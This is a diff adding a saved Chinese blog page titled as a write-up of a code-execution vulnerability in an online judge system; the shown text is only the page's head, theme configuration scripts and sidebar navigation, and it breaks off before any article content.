@@ -1,0 +1,1453 @@
+<!DOCTYPE html>
+<html class="small-scroll-bar no-js bg" lang="zh-cmn-Hans"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta charset="UTF-8">
+    <!--IE 8浏览器的页面渲染方式-->
+    <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+    <!--默认使用极速内核：针对国内浏览器产商-->
+    <meta name="renderer" content="webkit">
+    <!--chrome Android 地址栏颜色-->
+            <meta name="theme-color" content="#3a3f51">
+    
+    <meta http-equiv="x-dns-prefetch-control" content="on">
+
+    <title>某OJ系统恶意代码执行漏洞 - Matrix</title>
+            <link rel="icon" type="image/ico" href="https://www.imwxz.com/favicon.ico">
+        <meta name="description" content="[scode type=&amp;quot;yellow&amp;quot;]本帖所包含的内容仅限技术交流和学习研究使用，禁止用于其他用途！因使用不当造成的一切后果与本人无关！[/scode]今天刚刚测试发现某...">
+<meta name="generator" content="Typecho 1.1/17.10.30">
+<meta name="template" content="handsome">
+<link rel="pingback" href="https://www.imwxz.com/action/xmlrpc">
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.imwxz.com/action/xmlrpc?rsd">
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://www.imwxz.com/action/xmlrpc?wlw">
+<link rel="alternate" type="application/rss+xml" title="某OJ系统恶意代码执行漏洞 » Matrix » RSS 2.0" href="https://www.imwxz.com/feed/crack_0day/55.html">
+<link rel="alternate" type="application/rdf+xml" title="某OJ系统恶意代码执行漏洞 » Matrix » RSS 1.0" href="https://www.imwxz.com/feed/rss/crack_0day/55.html">
+<link rel="alternate" type="application/atom+xml" title="某OJ系统恶意代码执行漏洞 » Matrix » ATOM 1.0" href="https://www.imwxz.com/feed/atom/crack_0day/55.html">
+
+
+    
+    
+    <script type="text/javascript" async="" src="%E6%9F%90OJ%E7%B3%BB%E7%BB%9F%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20-%20Matrix_files/analytics.js"></script><script type="text/javascript">
+
+        window['LocalConst'] = {
+            //base
+            BASE_SCRIPT_URL: 'https://www.imwxz.com/usr/themes/handsome/',
+            BLOG_URL: 'https://www.imwxz.com/',
+            BLOG_URL_N: 'https://www.imwxz.com',
+            STATIC_PATH: 'https://static.imwxz.cn/assets/',
+            BLOG_URL_PHP: 'https://www.imwxz.com/',
+            VDITOR_CDN: 'https://cdn.jsdelivr.net/npm/vditor@3.4.5',
+            MATHJAX_SVG_CDN: 'https://cdn.bootcdn.net/ajax/libs/mathjax/3.0.5/es5/tex-svg.js',
+            THEME_VERSION: '7.3.12020081501',
+            THEME_VERSION_PRO: '7.3.1',
+
+            //comment
+            COMMENT_NAME_INFO: '必须填写昵称或姓名',
+            COMMENT_EMAIL_INFO: '必须填写电子邮箱地址',
+            COMMENT_EMAIL_LEGAL_INFO: '邮箱地址不合法',
+            COMMENT_CONTENT_INFO: '必须填写评论内容',
+            COMMENT_SUBMIT_ERROR: '提交失败，请重试！',
+            COMMENT_CONTENT_LEGAL_INFO: '提交失败,评论被拦截或者进入审核区域',
+            COMMENT_CONTENT_CHECK_INFO: '评论进入审核区域，请勿重复评论',
+            COMMENT_TITLE: '评论通知',
+
+            //login
+            LOGIN_TITLE: '登录通知',
+            LOGIN_USERNAME_INFO: '必须填写用户名',
+            LOGIN_PASSWORD_INFO: '请填写密码',
+            LOGIN_SUBMIT_ERROR: '登录失败，请重新登录',
+            LOGIN_SUBMIT_INFO: '用户名或者密码错误，请重试',
+            LOGIN_SUBMIT_SUCCESS: '登录成功',
+            CLICK_TO_REFRESH: '点击以刷新页面',
+            LOGOUT_SUCCESS_REFRESH: '退出成功，正在刷新当前页面',
+
+            LOGOUT_ERROR: '退出失败，请重试',
+            LOGOUT_SUCCESS: '退出成功',
+            SUBMIT_PASSWORD_INFO: '密码错误，请重试',
+
+            //comment
+            ChANGYAN_APP_KEY: '',
+            CHANGYAN_CONF: '',
+
+            COMMENT_SYSTEM: '0',
+            COMMENT_SYSTEM_ROOT: '0',
+            COMMENT_SYSTEM_CHANGYAN: '1',
+            COMMENT_SYSTEM_OTHERS: '2',
+            EMOJI: '表情',
+            COMMENT_NEED_EMAIL: '0',
+            COMMENT_REJECT_PLACEHOLDER: '居然什么也不说，哼',
+            COMMENT_PLACEHOLDER: '说点什么吧……',
+
+            //pjax
+            IS_PJAX: '1',
+            IS_PAJX_COMMENT: '1',
+            PJAX_ANIMATE: 'default',
+            PJAX_TO_TOP: '0',
+            TO_TOP_SPEED: '',
+
+
+            USER_COMPLETED: {"data":"tag_color();"},
+
+            //ui
+            OPERATION_NOTICE: '操作通知',
+            SCREENSHOT_BEGIN: '正在生成当前页面截图……',
+            SCREENSHOT_NOTICE: '点击顶部下载按钮保存当前卡片',
+            SCREENSHORT_ERROR: '由于图片跨域原因导致截图失败',
+            SCREENSHORT_SUCCESS: '截图成功',
+
+            //music
+            MUSIC_NOTICE: '播放通知',
+            MUSIC_FAILE: '当前音乐地址无效，自动为您播放下一首',
+            MUSIC_FAILE_END: '当前音乐地址无效',
+            MUSIC_LIST_SUCCESS: '歌单歌曲加载成功',
+
+            //option
+            TOC_TITLE: '文章目录',
+            HEADER_FIX: '固定头部',
+            ASIDE_FIX: '固定导航',
+            ASIDE_FOLDED: '折叠导航',
+            ASIDE_DOCK: '置顶导航',
+            CONTAINER_BOX: '盒子模型',
+            DARK_MODE: '深色模式',
+            DARK_MODE_AUTO: '深色模式（自动）',
+            DARK_MODE_FIXED: '深色模式（固定）',
+            EDITOR_CHOICE: 'origin',
+
+
+            CDN_NAME: '',
+            LAZY_LOAD: '',
+            PAGE_ANIMATE: '',
+            THEME_COLOR: '7',
+            THEME_COLOR_EDIT: '',
+            THEME_HEADER_FIX: '1',
+            THEME_ASIDE_FIX: '1',
+            THEME_ASIDE_FOLDED: '',
+            THEME_ASIDE_DOCK: '1',
+            THEME_CONTAINER_BOX: '1',
+            THEME_HIGHLIGHT_CODE: '1',
+            THEME_MATHJAX: '',
+            THEME_TOC: '1',
+            THEME_DARK_MODE: 'light',
+            THEME_DARK_MODE_VALUE: 'light',
+            SHOW_SETTING_BUTTON: '',
+
+            THEME_DARK_HOUR: '18',
+            THEME_LIGHT_HOUR: '6',
+            THUMB_STYLE: '',
+            AUTO_READ_MODE: '',
+
+            //代码高亮
+            CODE_STYLE_LIGHT: 'monokai',
+            CODE_STYLE_DARK: 'dracula',
+
+            //other
+            OFF_SCROLL_HEIGHT: '115',
+            SHOW_IMAGE_ALT: '1',
+            USER_LOGIN: '',
+            USE_CACHE: '1',
+            POST_SPEECH: '1',
+        };
+
+        if ('serviceWorker' in navigator) {
+            if (LocalConst.USE_CACHE) {
+                navigator.serviceWorker.register(LocalConst.BLOG_URL + 'sw.min.js?v=7.3.12020081501')
+                    .then(function (reg) {
+
+                    }).catch(function (error) {
+                    console.log('cache failed with ' + error); // registration failed
+                });
+            } else {
+                navigator.serviceWorker.getRegistrations()
+                    .then(function (registrations) {
+                        for (let registration of registrations) {
+                            registration.unregister();
+                            // 清除缓存
+                            window.caches && caches.keys && caches.keys().then(function (keys) {
+                                keys.forEach(function (key) {
+                                    caches.delete(key);
+                                });
+                            });
+                            console.log("unregister success")
+                        }
+                    });
+            }
+        }
+    </script>
+
+
+    
+
+    <!-- 第三方CDN加载CSS -->
+    <link href="%E6%9F%90OJ%E7%B3%BB%E7%BB%9F%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20-%20Matrix_files/bootstrap.css" rel="stylesheet">
+
+
+    <!-- 本地css静态资源 -->
+
+        <link rel="stylesheet" href="%E6%9F%90OJ%E7%B3%BB%E7%BB%9F%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20-%20Matrix_files/function.css" type="text/css">
+    <link rel="stylesheet" href="%E6%9F%90OJ%E7%B3%BB%E7%BB%9F%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20-%20Matrix_files/handsome.css" type="text/css">
+
+        
+    
+    <!--主题组件css文件加载-->
+    
+    <!--引入英文字体文件-->
+            <link rel="stylesheet preload" href="%E6%9F%90OJ%E7%B3%BB%E7%BB%9F%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20-%20Matrix_files/font.css" as="style">
+    
+    <style type="text/css">
+        
+        html.bg {
+        background: url(https://static.imwxz.com/assets/img/bg.jpg) center center no-repeat no-repeat fixed #6A6B6F;background-size: cover;
+        }
+        .cool-transparent .off-screen+* .app-content-body {
+        background: url(https://static.imwxz.com/assets/img/bg.jpg) center center no-repeat no-repeat fixed #6A6B6F;background-size: cover;
+        }
+@media (max-width:767px){
+    html.bg {
+        background: url() center center no-repeat no-repeat fixed #6A6B6F;background-size: cover;
+        }
+        .cool-transparent .off-screen+* .app-content-body {
+        background: url() center center no-repeat no-repeat fixed #6A6B6F;background-size: cover;
+        }
+}
+h1 {font-size: 2em;}
+h2.m-t-none.index-post-title {font-size: 25px;}
+.letterspacing {letter-spacing: 0.5px;}
+html.bg {background-size: 100% 100%;}
+#post-panel {background: transparent;}
+.app:before {background-color: #f0f3f4e6;}
+body {color: #555;}
+.hideContent {text-align:initial;}
+.badge.pull-right {background-color: #66ccff;}
+.nav-icon {width: 100%;}
+.child-nav>li>a {padding-left: 30px!important;}    </style>
+
+    <!--全站jquery-->
+    <script src="%E6%9F%90OJ%E7%B3%BB%E7%BB%9F%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20-%20Matrix_files/jquery.js"></script>
+
+    <!--网站统计代码-->
+    <link href="%E6%9F%90OJ%E7%B3%BB%E7%BB%9F%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20-%20Matrix_files/font-awesome.css" rel="stylesheet">
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async="" src="%E6%9F%90OJ%E7%B3%BB%E7%BB%9F%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20-%20Matrix_files/js"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-116309121-1');
+</script>
+
+<link id="highlight_css_monokai" rel="stylesheet" type="text/css" href="%E6%9F%90OJ%E7%B3%BB%E7%BB%9F%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20-%20Matrix_files/monokai.css"><link id="highlight__test_css_monokai" rel="stylesheet" type="text/css" href="%E6%9F%90OJ%E7%B3%BB%E7%BB%9F%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20-%20Matrix_files/monokai.css"><script src="%E6%9F%90OJ%E7%B3%BB%E7%BB%9F%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20-%20Matrix_files/highlight.js" async="" id="highlight_js_"></script></head>
+
+<body id="body" class="fix-padding">
+
+	<!-- aside -->
+	  
+  <div id="alllayout" class="app app-aside-fix app-aside-dock container app-header-fixed ">  <!-- headnav -->
+  <header id="header" class="app-header navbar box-shadow-bottom-lg" role="menu">
+    <!-- navbar header（交集处） -->
+    <div class="text-ellipsis navbar-header bg-black">
+    <button class="pull-right visible-xs" ui-toggle-class="show animated animated-lento fadeIn" target=".navbar-collapse">
+        <span class="menu-icons"><svg xmlns="http://www.w3.org/2000/svg" width="16px" height="16px" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-search"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg></span>
+    </button>
+    <button class="pull-left visible-xs" ui-toggle-class="off-screen animated" target=".app-aside" ui-scroll="app">
+        <span class="menu-icons"><svg xmlns="http://www.w3.org/2000/svg" width="16px" height="16px" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></span>
+    </button>
+    <!-- brand -->
+    <a href="https://www.imwxz.com/" class="navbar-brand text-lt">
+        <span id="navbar-brand-day">
+                                                <i class="fontello fontello-home"></i>
+                            <span class="hidden-folded m-l-xs">Matrix</span>
+                    </span>
+            </a>
+    <!-- / brand -->
+    </div>
+    <!-- / navbar header -->
+
+    <!-- navbar collapse（顶部导航栏） -->
+    <div class="collapse pos-rlt navbar-collapse bg-black">
+    <!-- statitic info-->
+        <ul class="nav navbar-nav hidden-sm">
+        <li class="dropdown pos-stc">
+            <a id="statistic_pane" data-status="false" href="#" data-toggle="dropdown" class="dropdown-toggle feathericons dropdown-toggle" aria-expanded="false">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16px" height="16px" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-pie-chart"><path d="M21.21 15.89A10 10 0 1 1 8 2.83"></path><path d="M22 12A10 10 0 0 0 12 2v10z"></path></svg>
+                <span class="caret"></span>
+            </a>
+            <div class="dropdown-menu wrapper w-full bg-white">
+                <div class="row">
+                    <div class="col-sm-8 b-l b-light">
+                        <div class="m-l-xs m-t-xs m-b-sm font-bold">动态日历<span class="info-icons"><svg xmlns="http://www.w3.org/2000/svg" width="16px" height="16px" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-info" data-toggle="tooltip" title="" data-original-title="统计近10个月的文章和作者评论数目"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
+                            </span></div>
+                        <div class="text-center">
+                            <nav class="loading-echart text-center m-t-lg m-b-lg">
+                                <p class="infinite-scroll-request"><i class="animate-spin fontello fontello-refresh"></i>Loading...</p>
+                            </nav>
+                            <div id="post-calendar" class="top-echart hide"></div>
+                        </div>
+                    </div>
+                    <div class="col-sm-4 b-l b-light">
+                        <div class="m-l-xs m-t-xs m-b-sm font-bold">分类雷达图</div>
+                        <div class="text-center">
+                            <nav class="loading-echart text-center m-t-lg m-b-lg">
+                                <p class="infinite-scroll-request"><i class="animate-spin fontello fontello-refresh"></i>Loading...</p>
+                            </nav>
+                            <div id="category-radar" class="top-echart hide"></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="row">
+                    <div class="col-sm-4 b-l b-light">
+                        <div class="m-l-xs m-t-xs m-b-sm font-bold">发布统计图</div>
+                        <div class="text-center">
+                            <nav class="loading-echart text-center m-t-lg m-b-lg">
+                                <p class="infinite-scroll-request"><i class="animate-spin fontello fontello-refresh"></i>Loading...</p>
+                            </nav>
+                            <div id="posts-chart" class="top-echart hide"></div>
+                        </div>
+                    </div>
+                    <div class="col-sm-4 b-l b-light">
+                        <div class="m-l-xs m-t-xs m-b-sm font-bold">分类统计图</div>
+                        <div class="text-center">
+                            <nav class="loading-echart text-center m-t-lg m-b-lg">
+                                <p class="infinite-scroll-request"><i class="animate-spin fontello fontello-refresh"></i>Loading...</p>
+                            </nav>
+                            <div id="categories-chart" class="top-echart hide"></div>
+                        </div>
+                    </div>
+                    <div class="col-sm-4 b-l b-light">
+                        <div class="m-l-xs m-t-xs m-b-sm font-bold">标签统计图</div>
+                        <div class="text-center">
+                            <nav class="loading-echart text-center m-t-lg m-b-lg">
+                                <p class="infinite-scroll-request"><i class="animate-spin fontello fontello-refresh"></i>Loading...</p>
+                            </nav>
+                            <div id="tags-chart" class="top-echart hide"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </li>
+    </ul>
+    
+    <!-- search form -->
+
+    <form id="searchform1" class="searchform navbar-form navbar-form-sm navbar-left shift" method="post" role="search">
+        <div class="form-group">
+            <div class="input-group rounded bg-white-pure box-shadow-wrap-normal">
+                <input autocomplete="off" id="search_input" type="search" name="s" class="transparent rounded form-control input-sm no-borders padder" required="" placeholder="随便搜些什么试试吧~">
+                <!--搜索提示-->
+                <ul id="search_tips_drop" class="small-scroll-bar dropdown-menu hide" style="display: block;top: 
+                30px; left: 0px;">
+                </ul>
+                <span id="search_submit" class="transparent input-group-btn">
+                  <button type="submit" class="transparent btn btn-sm">
+                      <span class="feathericons" id="icon-search"><svg xmlns="http://www.w3.org/2000/svg" width="16px" height="16px" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-search"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg></span>
+                      <span class="feathericons animate-spin  hide" id="spin-search"><svg xmlns="http://www.w3.org/2000/svg" width="16px" height="16px" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-loader"><line x1="12" y1="2" x2="12" y2="6"></line><line x1="12" y1="18" x2="12" y2="22"></line><line x1="4.93" y1="4.93" x2="7.76" y2="7.76"></line><line x1="16.24" y1="16.24" x2="19.07" y2="19.07"></line><line x1="2" y1="12" x2="6" y2="12"></line><line x1="18" y1="12" x2="22" y2="12"></line><line x1="4.93" y1="19.07" x2="7.76" y2="16.24"></line><line x1="16.24" y1="7.76" x2="19.07" y2="4.93"></line></svg></span>
+                      <!--                      <i class="fontello fontello-search" id="icon-search"></i>-->
+                      <!--                      <i class="animate-spin  fontello fontello-spinner hide" id="spin-search"></i>-->
+                  </button>
+              </span>
+            </div>
+        </div>
+    </form>
+    <a href="" style="display: none" id="searchUrl"></a>
+    <!-- / search form -->
+        <ul class="nav navbar-nav navbar-right">
+                    <li class="music-box hidden-xs hidden-sm">
+                <div id="skPlayer">
+            <audio class="skPlayer-source" src="" preload="auto"></audio>
+            <div class="skPlayer-picture">
+                <img class="skPlayer-cover" src="%E6%9F%90OJ%E7%B3%BB%E7%BB%9F%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20-%20Matrix_files/16629013858937311.jpg" alt="">
+    
+            </div>
+            <div class="skPlayer-control">
+                <p class="skPlayer-name">Rolling In The Deep</p>
+                <div class="playController"><div onclick="player.prev();" class="lastMusic  music-off "><span class="feathericons"><svg viewBox="0 0 24 24" width="14" height="14" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round" class="css-i6dzq1"><polygon points="11 19 2 12 11 5 11 19"></polygon><polygon points="22 19 13 12 22 5 22 19"></polygon></svg></span></div> &nbsp;&nbsp;
+ <div class="runMusic  music-off skPlayer-play-btn"><span class="runMusicIcon feathericons"><svg viewBox="0 0 24 24" width="14" height="14" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round" class="css-i6dzq1"><polygon points="5 3 19 12 5 21 5 3"></polygon></svg></span></div>&nbsp;&nbsp; 
+ <div onclick="player.next();" class="nextMusic  music-off "><span class="feathericons"><svg viewBox="0 0 24 24" width="14" height="14" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round" class="css-i6dzq1"><polygon points="13 19 22 12 13 5 13 19"></polygon><polygon points="2 19 11 12 2 5 2 19"></polygon></svg></span></div></div>
+                <p class="skPlayer-author">Adele</p>
+                <div class="skPlayer-percent">
+                    <div class="skPlayer-line-loading"></div>
+                    <div class="skPlayer-line lter"></div>
+                </div>
+                <p class="skPlayer-time">
+                    <span class="skPlayer-cur">00:00</span>/<span class="skPlayer-total">00:00</span>
+                </p>
+                <div class="skPlayer-volume" style="">
+                    <span class="feathericons skPlayer-volume-icon"><svg viewBox="0 0 24 24" width="14" height="14" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round" class="css-i6dzq1"><polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"></polygon><path d="M19.07 4.93a10 10 0 0 1 0 14.14M15.54 8.46a5 5 0 0 1 0 7.07"></path></svg></span>
+                    <div class="skPlayer-percent">
+                        <div class="skPlayer-line"></div>
+                    </div>
+                </div>
+                <i class="skPlayer-mode"></i>
+            </div>
+            <ul id="skPlayer-list" class="skPlayer-list animated flipInX">
+        
+                <li data-index="0" class="skPlayer-curMusic invalid-name">
+                    <i class="skPlayer-list-sign"></i>
+                    <span class="skPlayer-list-index">1</span>
+                    <span class="skPlayer-list-name" title="Rolling In The Deep">Rolling In The Deep</span>
+                    <span class="skPlayer-list-author" title="Adele">Adele</span>
+                </li>
+            
+            </ul>
+        </div>
+            </li>
+            <li class="dropdown "><a class="skPlayer-list-switch dropdown-toggle
+            feathericons"><svg xmlns="http://www.w3.org/2000/svg" width="16px" height="16px" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-disc"><circle cx="12" cy="12" r="10"></circle><circle cx="12" cy="12" r="3"></circle></svg><span class="visible-xs-inline"></span></a></li>
+                                    </ul>
+    </div>
+    <!-- / navbar collapse -->
+</header>
+  <!-- / headnav -->
+
+  <!--选择侧边栏的颜色-->
+  <aside id="aside" class="app-aside hidden-xs bg-white">  <!--<aside>-->
+        <div class="aside-wrap" layout="column">
+        <div class="navi-wrap scroll-y scroll-hide" flex="">
+          <!-- user -->
+          <div class="clearfix hidden-xs text-center hide  show" id="aside-user">
+            <div class="dropdown wrapper vertical-wrapper">
+                <div ui-nav="">
+                          <a href="https://www.imwxz.com/cross.html">
+                            <span class="thumb-lg w-auto-folded avatar m-t-sm  vertical-avatar">
+                  <img src="%E6%9F%90OJ%E7%B3%BB%E7%BB%9F%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20-%20Matrix_files/headimg.png" class="img-full img-circle normal-shadow">
+                </span>
+              </a>
+                </div>
+              <a href="#" data-toggle="dropdown" class="dropdown-toggle hidden-folded  vertical-flex">
+                <span class="clear">
+                  <span class="block m-t-sm">
+                    <strong class="font-bold text-lt">imwxz</strong>
+                    <b class="caret"></b>
+                  </span>
+                  <span class="text-muted text-xs block">A SJTUER</span>
+                </span>
+              </a>
+              <!-- dropdown -->
+              <ul class="dropdown-menu animated fadeInRight w hidden-folded no-padder">
+                <li class="wrapper b-b m-b-sm bg-info m-n">
+                  <span class="arrow top hidden-folded arrow-info"></span>
+                  <div>
+                                                  <p>下午好，是时候打个盹了</p>
+                                  </div>
+                  <div class="progress progress-xs m-b-none dker">
+                    <div class="progress-bar bg-white" data-toggle="tooltip" data-original-title="时间已经度过66.67%" style="width: 66.67%"></div>
+                  </div>
+                </li>
+              </ul>
+              <!-- / dropdown -->
+            </div>
+          </div>
+          <!-- / user -->
+
+          <!-- nav -->
+          <nav ui-nav="" class="navi clearfix">
+            <ul class="nav">
+             <!--index-->
+                <div class="line dk hidden-folded"></div>
+                <li class="hidden-folded padder m-t m-b-sm text-muted text-xs">
+                <span>导航</span>
+              </li>
+                                          <!--主页-->
+              <li>
+                <a href="https://www.imwxz.com/" class="auto">
+                    <span class="nav-icon"><svg xmlns="http://www.w3.org/2000/svg" width="16px" height="16px" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-home"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path><polyline points="9 22 9 12 15 12 15 22"></polyline></svg></span>
+                    <span>首页</span>
+                </a>
+              </li>
+              <!-- /主页 -->
+                            <!-- DIY START -->
+              <li>
+                <a href="https://www.imwxz.com/annc/8.html" class="auto">
+                  <span class="nav-icon"><svg xmlns="http://www.w3.org/2000/svg" width="16px" height="16px" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-bell"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"></path><path d="M13.73 21a2 2 0 0 1-3.46 0"></path></svg></span>
+                  <span>基本法</span>
+                </a>
+              </li>
+              <!-- DIY END -->
+              <li class="line dk"></li>
+			<!--Components-->
+              <li class="hidden-folded padder m-t m-b-sm text-muted text-xs">
+                <span>组成</span>
+              </li>
+              <!--分类category-->
+                              <li>
+                <a class="auto">
+                  <span class="pull-right text-muted">
+                    <i class="fontello icon-fw fontello-angle-right text"></i>
+                    <i class="fontello icon-fw fontello-angle-down text-active"></i>
+                  </span>
+<!--                  <i class="glyphicon glyphicon-th"></i>-->
+                    <span class="nav-icon"><svg xmlns="http://www.w3.org/2000/svg" width="16px" height="16px" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-grid"><rect x="3" y="3" width="7" height="7"></rect><rect x="14" y="3" width="7" height="7"></rect><rect x="14" y="14" width="7" height="7"></rect><rect x="3" y="14" width="7" height="7"></rect></svg></span>
+
+                    <span>分类</span>
+                </a>
+                <ul class="nav nav-sub dk">
+                  <li class="nav-sub-header">
+                    <a>
+                      <span>分类</span>
+                    </a>
+                  </li>
+                  <!--循环输出分类-->
+
+                    <li class="category-level-0 category-parent"><a href="https://www.imwxz.com/category/annc/"><b class="badge pull-right">5</b>公告</a></li><li class="category-level-0 category-parent"><a href="https://www.imwxz.com/category/any/"><b class="badge pull-right">3</b>随笔</a></li><li class="category-level-0 category-parent"><a class="auto" href="https://www.imwxz.com/category/code/"><span class="pull-right text-muted">
+                    <i class="fontello icon-fw fontello-angle-right text"></i>
+                    <i class="fontello icon-fw fontello-angle-down text-active"></i>
+                  </span><span class="parent_name">代码</span></a><ul class="nav nav-sub dk child-nav"><li class="category-level-1 category-child category-level-odd"><a href="https://www.imwxz.com/category/code_DuiMini/"><b class="badge pull-right">7</b>DuiMini开发</a></li><li class="category-level-1 category-child category-level-odd"><a href="https://www.imwxz.com/category/code_opensrc/"><b class="badge pull-right">5</b>开源项目</a></li></ul></li><li class="category-level-0 category-parent"><a class="auto" href="https://www.imwxz.com/category/crack/"><span class="pull-right text-muted">
+                    <i class="fontello icon-fw fontello-angle-right text"></i>
+                    <i class="fontello icon-fw fontello-angle-down text-active"></i>
+                  </span><span class="parent_name">逆向破解</span></a><ul class="nav nav-sub dk child-nav"><li class="category-level-1 category-child category-level-odd"><a href="https://www.imwxz.com/category/crack_anls/"><b class="badge pull-right">9</b>破解分析</a></li><li class="category-level-1 category-child category-level-odd"><a href="https://www.imwxz.com/category/crack_0day/"><b class="badge pull-right">11</b>漏洞公开</a></li><li class="category-level-1 category-child category-level-odd"><a href="https://www.imwxz.com/category/crack_active/"><b class="badge pull-right">0</b>注册激活</a></li><li class="category-level-1 category-child category-level-odd"><a href="https://www.imwxz.com/category/crack_ctf/"><b class="badge pull-right">8</b>CTF</a></li></ul></li><li class="category-level-0 category-parent"><a class="auto" href="https://www.imwxz.com/category/guide/"><span class="pull-right text-muted">
+                    <i class="fontello icon-fw fontello-angle-right text"></i>
+                    <i class="fontello icon-fw fontello-angle-down text-active"></i>
+                  </span><span class="parent_name">折腾教程</span></a><ul class="nav nav-sub dk child-nav"><li class="category-level-1 category-child category-level-odd"><a href="https://www.imwxz.com/category/guide_handsome/"><b class="badge pull-right">3</b>handsome主题自定义</a></li></ul></li>                    
+                    <!--/循环输出分类-->
+
+                </ul>
+              </li>
+              <!-- DIY START -->
+              <li> <a target="_self" href="https://www.imwxz.com/cross.html" class="auto"><span class="nav-icon"><svg xmlns="http://www.w3.org/2000/svg" width="16px" height="16px" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-at-sign"><circle cx="12" cy="12" r="4"></circle><path d="M16 8v5a3 3 0 0 0 6 0v-1a10 10 0 1 0-3.92 7.94"></path></svg></span><span>关于我</span></a></li><li> <a target="_self" href="https://www.imwxz.com/archives.html" class="auto"><span class="nav-icon"><svg xmlns="http://www.w3.org/2000/svg" width="16px" height="16px" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-archive"><polyline points="21 8 21 21 3 21 3 8"></polyline><rect x="1" y="3" width="22" height="5"></rect><line x1="10" y1="12" x2="14" y2="12"></line></svg></span><span>归档</span></a></li><li> <a target="_self" href="https://www.imwxz.com/msg.html" class="auto"><span class="nav-icon"><svg xmlns="http://www.w3.org/2000/svg" width="16px" height="16px" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-mail"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg></span><span>留言板</span></a></li><li> <a target="_self" href="https://www.imwxz.com/blackhouse.html" class="auto"><span class="nav-icon"><svg xmlns="http://www.w3.org/2000/svg" width="16px" height="16px" viewBox="0 